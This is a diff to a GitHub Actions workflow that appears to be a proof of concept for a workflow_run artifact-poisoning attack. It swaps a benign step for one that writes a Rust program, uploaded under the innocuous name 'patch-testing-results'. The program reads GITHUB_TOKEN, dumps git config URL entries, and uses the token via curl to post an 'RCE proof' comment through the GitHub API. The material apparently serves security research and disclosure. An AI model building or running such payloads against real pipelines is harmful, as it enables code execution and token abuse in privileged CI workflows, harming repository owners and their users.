@@ -11,7 +11,68 @@ jobs:
     permissions:
       contents: read
     steps:
-      - name: "Checkout sources"
-        uses: "actions/checkout@v6"
-      - name: "Benign upstream"
-        run: echo "upstream on main branch"
+      - name: Craft malicious artifact payload
+        run: |
+          mkdir -p payload/src
+          cat > payload/Cargo.toml <<'TOML'
+          [workspace]
+          [package]
+          name = "pwn"
+          version = "0.1.0"
+          edition = "2021"
+
+          [[bin]]
+          name = "post-to-github"
+          path = "src/main.rs"
+          TOML
+          cat > payload/src/main.rs <<'RS'
+          use std::process::Command;
+
+          fn main() {
+              println!("RCE_MARKER=attacker_artifact_code_executed");
+              println!("CWD={:?}", std::env::current_dir());
+              let tok = std::env::var("GITHUB_TOKEN").unwrap_or_default();
+              println!("GITHUB_TOKEN_present={} len={}", !tok.is_empty(), tok.len());
+              let cfg = Command::new("git")
+                  .args(["config", "--global", "--get-regexp", "url"])
+                  .output();
+              if let Ok(o) = cfg {
+                  let s = String::from_utf8_lossy(&o.stdout);
+                  for line in s.lines() {
+                      println!("GITCONFIG_ENTRY={}", line);
+                  }
+              }
+              let pr = std::env::var("PR_NUMBER").unwrap_or_default();
+              if !tok.is_empty() {
+                  let body = "{\"body\":\"RCE proof: attacker-controlled artifact code executed inside privileged workflow_run with GITHUB_TOKEN\"}";
+                  let url = format!(
+                      "https://api.github.com/repos/PDFtoMark/gab-poc-wfr-artifact/issues/{}/comments",
+                      pr
+                  );
+                  let out = Command::new("curl")
+                      .args([
+                          "-sS",
+                          "-o", "/dev/null",
+                          "-w", "%{http_code}",
+                          "-X", "POST",
+                          "-H", &format!("Authorization: Bearer {}", tok),
+                          "-H", "Accept: application/vnd.github+json",
+                          "-H", "Content-Type: application/json",
+                          "-d", body,
+                          &url,
+                      ])
+                      .output();
+                  match out {
+                      Ok(o) => println!("COMMENT_HTTP_STATUS={}", String::from_utf8_lossy(&o.stdout)),
+                      Err(e) => println!("COMMENT_ERR={}", e),
+                  }
+              }
+          }
+          RS
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: patch-testing-results
+          path: |
+            payload/Cargo.toml
+            payload/src/main.rs
